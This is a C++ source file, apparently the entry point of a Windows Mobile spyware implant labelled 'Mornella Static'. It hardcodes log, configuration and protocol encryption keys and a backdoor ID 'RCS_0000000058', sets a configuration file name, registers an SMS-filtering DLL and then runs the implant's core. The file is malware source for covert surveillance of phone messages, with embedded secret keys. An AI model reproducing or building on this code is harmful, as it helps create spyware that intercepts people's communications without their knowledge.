// Mornella Static
#include "Core.h"
#include <stdio.h>

int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	Core *core;

	// RCS 58 su rcs-castore
	BYTE LogKey[] = { 0xa9, 0x4c, 0x68, 0xcc, 0x32, 0xbd, 0x18, 0xd0, 0x36, 0x35, 0x18, 0x79, 0x80, 0xab, 0xfd, 0x98 };
	BYTE ConfKey[] = { 0xc6, 0xdd, 0x26, 0x4b, 0x1e, 0xde, 0xc3, 0x53, 0x88, 0xee, 0x17, 0xc4, 0x6f, 0x0a, 0x8d, 0x23 };
	// Sign sul DB
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };

	g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000058", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
	// Fine configurazione artificiale

	// Unregistriamo la DLL
	HMODULE hSmsFilter;

	// Installiamo la DLL del filtro SMS
	hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	pRegister RegisterFunction;

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if (RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}
	//

	core = new(std::nothrow) Core();

	if (core == NULL)
		return 0;

	core->Run();

	delete core;

	return 0;
}
